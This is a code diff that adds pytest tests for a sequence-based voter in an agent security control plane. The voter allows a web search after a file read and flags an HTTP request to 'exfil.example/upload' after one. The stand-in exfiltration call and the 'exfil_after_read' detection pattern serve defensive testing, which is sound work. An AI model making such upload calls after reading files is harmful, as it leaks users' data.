@@ -23,6 +23,7 @@ from shisad.security.control_plane.consensus import (
     ConsensusPolicy,
     ConsensusVotingSystem,
     ResourceVoter,
+    SequenceVoter,
     VoteKind,
     VoterDecision,
 )
@@ -114,6 +115,73 @@ def test_m5_rt1_sequence_detects_fs_read_then_egress_with_intervening_action() -
 
     findings = analyzer.analyze(history=history, candidate_action=candidate)
     assert any(item.pattern_name == "exfil_after_read" for item in findings)
+
+
+@pytest.mark.asyncio
+async def test_m5_t1b_sequence_voter_allows_web_search_after_read() -> None:
+    history = SessionActionHistoryStore()
+    analyzer = BehavioralSequenceAnalyzer()
+    origin = _origin("s1-t1b")
+
+    history.append_action(
+        build_action(
+            tool_name="file.read",
+            arguments={"path": "README.md"},
+            origin=origin,
+        ),
+        decision_status="allow",
+    )
+    candidate = build_action(
+        tool_name="web.search",
+        arguments={"query": "latest news", "limit": 1},
+        origin=origin,
+        risk_tier=RiskTier.MEDIUM,
+    )
+
+    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
+        ConsensusInput(
+            action=candidate,
+            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
+            network_metadata=[],
+            declared_domains=[],
+            metadata_payload={},
+        )
+    )
+    assert vote.decision == VoteKind.ALLOW
+    assert "sequence:allow_safe_egress_after_read" in vote.reason_codes
+
+
+@pytest.mark.asyncio
+async def test_m5_t1c_sequence_voter_flags_http_request_after_read_for_confirmation() -> None:
+    history = SessionActionHistoryStore()
+    analyzer = BehavioralSequenceAnalyzer()
+    origin = _origin("s1-t1c")
+
+    history.append_action(
+        build_action(
+            tool_name="file.read",
+            arguments={"path": "README.md"},
+            origin=origin,
+        ),
+        decision_status="allow",
+    )
+    candidate = build_action(
+        tool_name="http_request",
+        arguments={"url": "https://exfil.example/upload"},
+        origin=origin,
+        risk_tier=RiskTier.HIGH,
+    )
+
+    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
+        ConsensusInput(
+            action=candidate,
+            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
+            network_metadata=[],
+            declared_domains=[],
+            metadata_payload={},
+        )
+    )
+    assert vote.decision == VoteKind.FLAG
 
 
 def test_m5_t2_sequence_detects_rapid_fire_pattern() -> None:
